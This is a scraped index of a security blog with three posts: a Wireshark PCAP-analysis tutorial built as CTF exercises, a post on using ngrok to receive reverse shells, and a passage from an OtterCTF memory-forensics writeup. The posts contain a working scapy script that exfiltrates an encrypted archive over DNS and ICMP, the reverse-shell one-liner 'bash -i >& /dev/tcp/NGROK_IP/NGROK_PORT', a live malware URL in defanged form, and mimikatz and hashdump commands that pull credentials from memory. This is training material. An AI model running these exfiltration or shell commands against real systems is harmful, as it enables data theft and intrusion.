frustrating. In a global attack like Wannacry, the real threat was time. The more analysts tried to be exhaustive, the more malware grew. The goal is to find important information quickly to stop the attack, while the security patches are put in place. This is why the first step, during static analysis, is important. This step can be decisive for the future. During the checking phase, if there is no relevant information, do not hesitate to restart from the beginning and repeat the procedure, in order to find more hypothesis. Concerning this first part related to methodology, it is over. The methodology is relatively simple and is done naturally. The rather complicated points are: force yourself to find hypotheses before starting the analysis head down and take a step back on the investigation. Another blocking point during the analysis will be the knowledge of the tools, including Wireshark. The following sections will be based on the use of tools and small tips and tricks to quickly extract the useful data. Practical example ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:14:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Clear TCP This practical work will aim to familiarize students with network tools and protocols. I chose to do these exercises as a “challenge” as in CTF. The purpose of each TP is to find a character string, a “flag”. The format is flag{ImTheFlag}. In this first TP, we will see a TCP communication without a cryptographic layer. Many protocols rely on TCP to operate. However, most of them are not encrypted by default, here is a non-exhaustive list: Telnet HTTP SMTP … ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:15:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Statement The exercise material can be found on the following link: Filename Hash Download link cleartcp.pcapng 09a6f779bfe37db11a83b60dc8484111 https://mega.nz/#!Ka4SAQYY!ky618XDVfmGMk0WNU46fprwlkgb8JJlG4BEd38QsEyA The goal here will be to find the content of the message sent by netcat. To do the manipulation again on your side, I invite you to read the following section, concerning the resolution. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:15:1","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Resolution In this first practical exercise, it’s not necessary to use CapAnalysis, because the PCAP file is ridiculously small. A simple quick view with Wireshark will be enough. Normally, if you have followed the previous chapters, something must be obvious to you: It is possible to find this result without our magic column. Wireshark is able to track a TCP connection flow. This is one of the most useful features in my opinion: Right click on the desired packet -\u003e Follow TCP stream A new window will appear with the content of the TCP stream. In our example, there is only one stream containing little information. However, it is possible to do the same on all TCP-based protocols and quickly obtain information. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:15:2","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Do it yourself Each challenge will have this section. With the following resources you’re able to reproduce the challenge environment at home. Prerequisites To do this task, and probably all challenge after, you’ll need: Docker Wireshark / tshark Setting up the environment Store the following code into a file called Dockerfile: FROM debian:latest RUN apt update \u0026\u0026 \\ apt install -y --no-install-recommends netcat.traditional RUN rm -rf /var/lib/apt/lists/* COPY run.sh /run.sh RUN chmod +x /run.sh EXPOSE 1664 ENTRYPOINT [\"/run.sh\"] In the Dockerfile folder, store the following bash code in run.sh: #!/bin/sh echo -n \"[+] Container IP: \" ip a | grep inet | awk '{print $2}' | tail -n+2 nc -lvp 1664 Now, just build your container, follow these command lines: $ sudo docker build . -t cleartcp # Generate the docke container $ sudo docker run --rm --name cleartcp -t cleartcp [+] Container IP: 172.17.0.2/16 listening on [any] 1664 ... Congratulation! You just did your first docker container! Wireshark analysis Docker provides a network interface and use your host as the gateway. So open Wireshark and listen on your docker0 network interface to catch all packets. If you’re seeing some ICMP and ARP packets, don’t worry. It’s just Docker if everything is well connected. Next step will be the easiest: sending data on the right port using netcat: $ echo \"Students cyber mooc !\" | nc 172.17.0.2 1664 ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:15:3","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"File transfer ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:16:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Statement In this PCAP file there is also some TCP traffic. But this time it’s not a text message, but a file. The purpose of this practical exercise will be to find it and open it to see what this mysterious file contains. Filename Hash Download link filetransfer.pcapng b1cfd7c12581d9b0b2c99008d3a7e746 https://mega.nz/#!iL5GES4b!NLrHvjJoYTSavweDCR1zxgsbyxsMsw-M9k-VWVLjUWM ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:16:1","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Resolution As in the previous practical exercise, there is no need to do a statistical analysis to see what contains the PCAP file. Normally now you don’t have any excuses for not having the data.data and data.text columns. When opening the file, you can see interesting bytes: In the red frame you can see PNG, this acronym is rather explicit, but we will talk a little bit about file structures. Almost all files have signatures, which is why our operating systems can open them with the appropriate software, even if you specify a wrong extension. In addition, the file command on Linux uses the signature to return its type. In the brown frame, we can see hexadecimal, the beginning of what seems to be a PNG. The signature present at the beginning and at the end of the files, is called magic numbers. If google that, you can easily find the magic numbers of a PNG: Exactly these bytes are present in the brown frame. We can deduce that we are dealing with a PNG image that has been transferred. The libpng site tells us a little more about the structure of a PNG. In particular, the signature at the end containing IEND chunk: As we can see in the red frame, it’s a PNG file: Another method to find the PNG file is using binwalk, as I said in tooling section, binwalk is carving tool. It will detect and try to identify file structure: Now we are 100% sure that our transferred file is a full PNG image. As said several times before, Wireshark is based on a tool called tshark. It has the advantage of being in CLI, so with a little practice, we can easily extract the desired data: Red frame: This is the tshark command. The PCAP file is opened and is displaying the raw content of data.data column. Yellow frame: The tr -d command will allow you to delete one or more characters. The output of tshark with the filter data.data looks like 00:11:22:22:33:44… with line breaks between each packet. tr allows me to delete these characters to have hexdecimal data on a single line. Brown frame: This hexadecimal line represents our PNG picture. Just decode it in a file to retrieve a valid PNG and complete the challenge. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:16:2","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Do it yourself Prerequisite As the last “Do it yourself” (DIY) I told you to use Docker. In fact, it’s not necessary: netcat Wireshark / tshark Send the picture In this “Do it yourself”, I’m going to use the loopback (lo) network interface. Instead of docker network interface. The main advantage of using this interface is the absence of noise during Wireshark capture session. Open a linux terminal: $ nc -lvp 3615 \u003e test.out As the last DIY, open Wireshark but listen on lo interface instead of docker one. When everything is properly set up, open a second linux terminal and send it to the desired TCP port: $ cat flag.png | nc 127.0.0.1 3615 As we can see, both file are similar. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:16:3","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Data exfiltration ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:17:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Statement When an attacker has been successfully compromised a target, he will tries to extract data as discreetly as possible. ICMP and DNS protocols are oftenly used for this. In the following PCAP file, an evil hacker has stole some sensitive data. Filename Hash Download link exfiltration.pcapng 1e481b149ee2d65c02d1eaea19aaedfa https://mega.nz/#!7WwWlApI!pohkUfpW_r1yvnPTUgIL2lsBx-N424YtkdZLUoON-gk ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:17:1","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Resolution When you open the PCAP file, you can see several protocols, such as ARP, ICMP, and DNS. If your columns look like mine, you should see data quickly in the ICMP, which should not contain any. Then, the subdomains for DNS requests are a little strange, to make it easier to read, I added a column with the filter dns.qry.name: If you have correctly understood the previous practical exercise, then extracting the data here shouldn’t be too difficult. In this PCAP file, I left the “noise” (ARP, ICMP with DNS), before starting to recover anything, we have to start making some hypotheses: What we know ICMP hex data looks to ASCII characters DNS subdomains looks to base64 encoded data Hypotheses Are ICMP decoded data printable? What’s the data hide in subdomains? Are ICMP and DNS data related to each other? Before taking out the heavy artillery and diving head down and extract everything, let’s try to extract the first ICMP package and the first sub-domain. Just right click on the desired element and copy the value, and decode them in your terminal: $ echo -n \"546865206b657920\" | xxd -r -p The key $ echo -n \"UEsDBBQACQAIAHOFd01q\" | base64 -d PK s�wMj $ echo -n \"UEsDBBQACQAIAHOFd01q\" | base64 -d | xxd -p 504b03041400090008007385774d6a The data contained in the ICMP is indeed ASCII encoded in hexa. The subdomain contains the characters “PK” followed by non-printable characters… Ok, let’s try to find what type of file it is. According to the following figure, I just decoded the base64 of the first subdomain and print it as hex: As the previous practical exercise,I went to the wikipedia page of file signatures and found that the first 4 bytes corresponded to the magic number of a ZIP archive: Now, we can answer to our previous hypotheses: Is ICMP data is printable? Yes, it starts with “The key”. Are encoded subdomains contains something relevant? Probably, there is ZIP magic number in the first subdomain. Are both protocol related to each other? Don’t know yet. Before starting with new hypotheses, let’s extract everything: $ tshark -r exfiltration.pcapng -Y icmp.resp_to -T fields -e data.text | xxd -r -p The key of the encrypted archive is: CyberMoocMooc $ tshark -r exfiltration.pcapng -Y 'ip.src == 172.17.0.1 \u0026\u0026 !icmp' -T fields -e dns.qry.name | sed 's/\\.makictf\\.wtf//g' | base64 -d PK s�wMjR��LY passwd_fileUT 9.�[ [...] When I’m trying to unzip the archive, it asks me for a password. Let’s try with “CyberMoocMooc”: ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:17:2","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Do it yourself As for the clear TCP, I made a small docker. This time I based the container on the image of Python2 - Alpine, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: Responder. Server side FROM python:2-alpine RUN apk add git RUN mkdir /responder \u0026\u0026 git clone https://github.com/SpiderLabs/Responder.git /responder COPY run.sh /run.sh RUN chmod +x /run.sh ENTRYPOINT [\"/run.sh\"] And the run.sh script: #!/bin/sh INTERFACE=$(ip a | grep BROADCAST | awk '{print $2}' | sed 's/@.*$//') cd /responder \u0026\u0026 ./Responder.py -I $INTERFACE -wrf Time to build and start our docker: $ sudo docker build . -t responder \u0026\u0026 sudo docker run --rm --name responder -t responder You should got something like that: 37: Responder up Client side For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic: As for the clear TCP, I made a small docker. This time I based the container on the image of Python2 - Alpine, because to simulate a DNS server that accepts all requests, I will use the SpiderLab script: Responder. Server side FROM python:2-alpine MAINTAINER Alan MARREC \u003camarrec@protonmail.com\u003e RUN apk add git RUN mkdir /responder \u0026\u0026 git clone https://github.com/SpiderLabs/Responder.git /responder COPY run.sh /run.sh RUN chmod +x /run.sh ENTRYPOINT [\"/run.sh\"] And the run.sh script: #!/bin/sh INTERFACE=$(ip a | grep BROADCAST | awk '{print $2}' | sed 's/@.*$//') cd /responder \u0026\u0026 ./Responder.py -I $INTERFACE -wrf Time to build and start our docker: $ sudo docker build . -t responder \u0026\u0026 sudo docker run --rm --name responder -t responder Client side For the client, basically your host, you can use the following python script (exfil.py) to generate the malicious traffic: #!/usr/bin/python3 #-*- coding: utf-8 -*- from scapy.all import * import binascii import base64 destIP = \"172.17.0.2\" ''' Exfiltration with ICMP @param mesg: Input to send through ICMP - C{bytes} @return: No return, sends packets. ''' def ping_exf(mesg): hex_mesg = str(binascii.hexlify(bytes(mesg, 'utf8')))[2:-1] # Removing of b' at start and ' at end n = 16 # Size of block list_split = [hex_mesg[i:i+n] for i in range(0, len(hex_mesg), n)] # Split string into list for i in range(0,len(list_split)): print(list_split[i]) send(IP(dst=destIP)/ICMP()/list_split[i]) ''' Exfiltration with DNS A requests. Send an archive / file or wathever splitted into 20 char / packet. Don't forget to put a responder server on the target. Responder will up a DNS server that accept all requests, even wrong one. @param mesg: Input to send via DNS A requests - C{bytes} @return: No return, sends packets. ''' def dns_exf(mesg): mesg = base64.b64encode(mesg) n = 20 list_split = [mesg[i:i+n] for i in range(0, len(mesg), n)] for i in range(0, len(list_split)): print(str(list_split[i])[2:-1]) part = (\"%s.makictf.wtf\" % str(list_split[i])[2:-1]) sr1(IP(dst=destIP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=part)),verbose=0) if __name__ == \"__main__\": key_archive = \"The key of the encrypted archive is: CyberMoocMooc\" f = open('passwd.zip','rb') enc_archive = f.read() f.close() ping_exf(key_archive) dns_exf(enc_archive) This script will convert a file to base64, then send it to fictitious subdomains. Just before, a string in hex is sent by ICMP. As part of our TP, I propose you to make an encrypted zip archive and send it by DNS, the key would be sent by ICMP. $ zip -e passwd.zip /etc/passwd Enter password: [Enter your password] It is now time to run Wireshark and the exfil_gen.py script. When the script is completed, then we can stop Wireshark capture and save the traffic into a PCAP file. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:17:3","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Trojan horse In this practical exercise, it will not be a CTF challenge task. It will be a real forensic case, with a real bad malware inside it. Then be careful with this PCAP, it contains a banking trojan. ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:18:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Statement The PCAP file can be download here: Filename Hash Download link 2018-11-13-traffic-analysis-exercise.pcap 221168dc0865c145fe977b2c373022f3 https://tinyurl.com/TP-malicious This practical exercise comes from: https://www.malware-traffic-analysis.net/2018/11/13/index.html And here is the questions to answer: What was the date and time the malicious traffic started? What is the MAC address of the infected Windows host? What is the host name of the infected Windows host? What is the user account name used on the infected Windows host? What URL in the pcap returned a Windows executable file? What is the size of the Windows executable file from that URL? What is the SHA256 hash of the Windows executable file from that URL? What type of malware is the Windows executable returned from that URL? ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:18:1","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Resolution You can find the official correction here, the password of the archive is “infected” : https://www.malware-traffic-analysis.net/2018/11/13/2018-11-13-traffic-analysis-exercise-answers.pdf.zip What URL in the pcap returned a Windows executable file? I didn’t do as the original author. I tried to find the malware first. I just did a research with “data.data” filter: As you can see in the red frame, there is a magic number. This magic number is for a PE file, or a Windows executable (portable executable). If your “data.text” column is blank, you should modify your Wireshark preferences for “data” protocol: According to the signature list on Wikipedia (cf. Resource 1): Donc, nous avons bien un executable Windows. Surement notre malware. À ce stade, il est possible de répondre à la question “What URL in the pcap returned a Windows executable file”: Then: hxxp://shumbildac[.]com/WES/fatog.php?l=ngul5.xap What is the size of the Windows executable file from that URL? Now I have to extract the PE file. You can do it with wireshark, or tshark: Then finding the size is quite easy now: What is the SHA256 hash of the Windows executable file from that URL? As above, it’s will be easy to find the hash: 97f149f146b0ec63c32abff204ae27638f0310536172b0f718f1a91a5672fe71 What type of malware is the Windows executable returned from that URL? We can check our file on VirusTotal.com. No need to upload the file, if it’s a well known malware, the hash is enough: It looks to be “Ursnif” banking malware, don’t run it on you Windows host! What was the date and time the malicious traffic started? Now that we found the malware, we can assume the date and time of the malicious traffic: At 2018/11/07 around 20:47 What is the MAC address of the infected Windows host? We can see the destination IP on the above screen: 10.22.15.119. It should be our infected Windows host. So the mac address is: 00:11:2f:d1:6e:52 What is the host name of the infected Windows host? To find a Windows hostname, I can filter on the IP and the DHCP protocol (bootp in Wireshark): Then, the hostname is: Danger-Win-PC What is the user account name used on the infected Windows host? Ok, it’s a Windows, we can guess some Kerberos traffic: Now, you can add a new column: carlos.danger And now we answered to all the questions! :D ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:18:2","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Ressources Wireshark team, We’re switching to Qt, October 2013, Wireshark blog: https://blog.wireshark.org/2013/10/switching-to-qt/ Wireshark team, Man page tshark, Wireshark documentations: https://www.wireshark.org/docs/man-pages/tshark.html Maki, OtterCTF 2018, 24 December, Maki blog: https://maki.bzh/courses/blog/writeups/otterctf2018/#otter-leak diceone, diceone/capanalysis docker, 2016, Docker Hub: https://hub.docker.com/r/diceone/capanalysis/ CapAnalysis team, PCAP of another point of view, CapAnalysis official website: https://www.capanalysis.net/ca/ ReFirmLabs, Binwalk, 2018, Official GitHub: https://github.com/ReFirmLabs/binwalk korczis, Foremost, 2016, Official GitHub: https://github.com/korczis/foremost PyShark, PyShark, Python packet parser using wireshark’s tshark, Official GitHub: https://kiminewt.github.io/pyshark/ Scapy team, Scapy project, Official website: https://scapy.net/ Linux-France team, grep man page, Linux-France: http://www.linux-france.org/article/man-fr/man1/grep-1.html Die team, strings man page, die website: https://linux.die.net/man/1/strings Linuxcommand team, tr man page, linuxcommand: http://linuxcommand.org/lc3_man_pages/tr1.html Systutorials team, xxd man page, systutorials: https://www.systutorials.com/docs/linux/man/1-xxd/ Wikipedia, ISO 8601, Wikipedia: https://fr.wikipedia.org/wiki/ISO_8601 cURL, curl.1 the man page, haxx.se: https://curl.haxx.se/docs/manpage.html Nico, Netcat parce que c’est trop fast0ch’, 20 December 2009, Les tutos de Nico: http://www.lestutosdenico.com/tutos-de-nico/netcat Pentester Academy, Learn pentesting online, pentesteracademy.com: https://www.pentesteracademy.com/ pentesteracademy, PA Toolkit (Pentester Academy Wireshark Toolkit), 2018, Official GitHub: https://github.com/pentesteracademy/patoolkit Wikipedia, Indicator of compromise, Wikipedia: https://en.wikipedia.org/wiki/Indicator_of_compromise Wireshark team, Display filter in Wireshark, Official Wireshark wiki: https://wiki.wireshark.org/DisplayFilters Wikipedia, Base64, Wikipedia: https://en.wikipedia.org/wiki/Base64 Wireshark team, Man page tshark, Wireshark documentations: https://www.wireshark.org/docs/man-pages/tshark.html Linuxcommand team, tr man page, linuxcommand: http://linuxcommand.org/lc3_man_pages/tr1.html Systutorials team, xxd man page, systutorials: https://www.systutorials.com/docs/linux/man/1-xxd/ Man team, rev(1) Linux man page, man7: http://man7.org/linux/man-pages/man1/rev.1.html Die team, base64(1) man page, die: https://linux.die.net/man/1/base64 SpiderLabs, Responder, 2017, GitHub: https://github.com/SpiderLabs/Responder Python crew, python docker, DockerHub: https://hub.docker.com/_/python/ VirusTotal, Analyze malicious file, VirusTotal: https://www.virustotal.com/ admin, Ursnif reloaded: tracing the latest trojan campaigns, 19/11/18, reaqta.com: https://reaqta.com/2018/11/ursnif-reloaded-tracing-latest-campaigns/ Wireshark team, Dynamic Host Configuration Protocol (DHCP), Wireshark official blog: https://wiki.wireshark.org/DHCP ","date":"2019-02-20","objectID":"maki.bzh/shorts/wiresharkhowtobasics/:19:0","tags":["methodology","wireshark","pcap","malware","forensic","blue team"],"title":"PCAP analysis : How to basic","uri":"maki.bzh/shorts/wiresharkhowtobasics/"},{"categories":["Shorts"],"content":"Using Ngrok in order to make a reverse shell or expose resources on Internet.","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Shorts"],"content":"The goal I think many of us do CTFs, but also many of us don’t have any money, because we’re student or addict to drugs. So when you don’t have any money, you get creative. For webguys who are looking for a reverse shell or who want admin cookies on a remote host (hello root-me), but don’t want to pay for a VPS, there is a free solution. Ngrok. ","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/:1:0","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Shorts"],"content":"How it works? Rather than making a super long and incomprehensible paragraph, here is a small diagram coming directly from the ngrok site: So for our needs we will make a tcp tunnel between our port listening with netcat and ngrok. To listen on the internet and wait for remote data: Now, let’s move on to practice. ","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/:2:0","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Shorts"],"content":"Ngrok installation All those step are explained on the ngrok website. But first, you need to create an account, it will have a unique identifier. You can put garbage: Username: bitedepoulet Email address: bite@poulet.com Password: *********** And then download the right archive, for me it’s Linux: https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip Unzip the archive, past the ngrok line with your private authtoken and we can start. ▶ unzip ngrok-stable-linux-amd64.zip Archive: ngrok-stable-linux-amd64.zip inflating: ngrok ▶ ./ngrok authtoken ENTERYOUROWN Authtoken saved to configuration file: /home/maki/.ngrok2/ngrok.yml ▶ ./ngrok help NAME: ngrok - tunnel local ports to public URLs and inspect traffic DESCRIPTION: ngrok exposes local networked services behinds NATs and firewalls to the [...] It’s successfully installed. ","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/:3:0","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Shorts"],"content":"Practical example Ok, so I start a boot2root machine on root-me.org: kioptrix 2 (download link + WU in resource section). Here is the RCE: Now, let’s check which command are available for a reverse shell: ; which nc python python2 python3 perl ruby php bash You can find lot of amazing payload on: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet We will use bash command with the following payload: bash -i \u003e\u0026 /dev/tcp/NGROK_IP/NGROK_PORT 0\u003e\u00261 NGROK_IP: Is the ngrok remote host with a domain like “0.tcp.ngrok.io”. NGROK_PORT: The forwarding port associate to the ngrok remote host. I used netcat for my port listening, but you can use python3 -m http.server 31337 to catch GET data with a real web server for example. ","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/:4:0","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Shorts"],"content":"Conclusion This little trick allowed me to solve a lot of challenges without having a VPS. I hope you enjoyed this little blogpost :) Feel free to ask me what you want on twitter @maki_chaz. Happy hacking guys :D ","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/:5:0","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Shorts"],"content":"Resources Root-me, Une plateforme rapide, accessible et réaliste pour tester vos compétences en hacking., Root-me official website: https://www.root-me.org/ Ngrok team, What is ngrok?, Official ngrok blog: https://ngrok.com/product Vulnhub, Kioptrix: Level 1.1 (#2), Vulnhub team: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/ Abatchy, Kioptrix 2 Walktrhough (Vulnhub), abatchy’s blog: https://www.abatchy.com/2016/12/kioptrix-2-walkthrough-vulnhub.html pentestmonkey, Reverse Shell Cheat Sheet, pentestmonkey blog: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet ","date":"2019-01-22","objectID":"maki.bzh/shorts/dontpayvps/:6:0","tags":["reverse shell","tricks","ngrok","nomoney"],"title":"Doing CTF without paying VPS","uri":"maki.bzh/shorts/dontpayvps/"},{"categories":["Writeups"],"content":"The memory dump to analyze can be found at this address: https://mega.nz/#!sh8wmCIL!b4tpech4wzc3QQ6YgQ2uZnOmctRZ2duQxDqxbkWYipQ ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:0:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"1 - What the password? The first thing to do with a memory dump: determine which OS is it and which version of the OS. Volatility needs those information to properly parse the memory: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (/opt/usr_land/OtterCTF.vmem) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002c430a0L Number of Processors : 2 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002c44d00L KPCR for CPU 1 : 0xfffff880009ef000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2018-08-04 19:34:22 UTC+0000 Image local date and time : 2018-08-04 22:34:22 +0300 Before continuing, I’m used to redirecting volatility plugins output into files. It will be faster if I need to check information in the future. I call them with the following syntax: p\u003cplugin name\u003e For example: for pstree it becomes ppstree Let’s get started. Finding a user password in a memory dump, there is not a lot of possibilities: Cracking NTLM hashes Find the password stored into processes Find the password stored in a file (the legendary password.txt on the desktop) ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:1:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Cracking NTLM hashes $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 hashdump Volatility Foundation Volatility Framework 2.6.1 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940::: With this, I have tried to break Rick’s NTLM hash on a website like crackstation. After two or three attempts I decided to try the second option: find the password into process memory. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:1:1","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Process, process, my wonderful process When I spoke about a process, it can be notepad.exe with a piece of text file in memory for example. Or, it can be the Windows “strongbox”: lsass.exe. Mimikatz is a famous tool used by pentesters and (unfortunately) by malwares. This tool takes advantages of some lsass weaknesses (and many others) to find clear text password in memory. Volatility plugin has been made: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 mimikatz Volatility Foundation Volatility Framework 2.6.1 Module User Domain Password -------- ---------------- ---------------- ---------------------------------------- wdigest Rick WIN-LO6FAF3DTFE MortyIsReallyAnOtter wdigest WIN-LO6FAF3DTFE$ WORKGROUP Great, the password has been found, so we got the flag. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:1:2","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Flag CTF{MortyIsReallyAnOtter} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:1:3","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"2 - General Info Now, we’re looking for 2 flags: computer’s IP and computer’s name. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:2:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Computer name Computer’s name is really easy to find because mimikatz plugins used previously brought it out: WIN-LO6FAF3DTFE. So the flag is: CTF{WIN-LO6FAF3DTFE} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:2:1","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Computer IP Computer’s IP address will not be much more complicated to find. By default, volatility can list all actives network connections with netscan plugin. This feature allows us to have a netstat view at memory acquisition. $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 netscan \u003e pnetscan $ cat pnetscan Volatility Foundation Volatility Framework 2.6.1 Offset(P) Proto Local Address Foreign Address State Pid Owner Created 0x7d60f010 UDPv4 0.0.0.0:1900 *:* 2836 BitTorrent.exe 2018-08-04 19:27:17 UTC+0000 0x7d62b3f0 UDPv4 192.168.202.131:6771 *:* 2836 BitTorrent.exe 2018-08-04 19:27:22 UTC+0000 0x7d62f4c0 UDPv4 127.0.0.1:62307 *:* 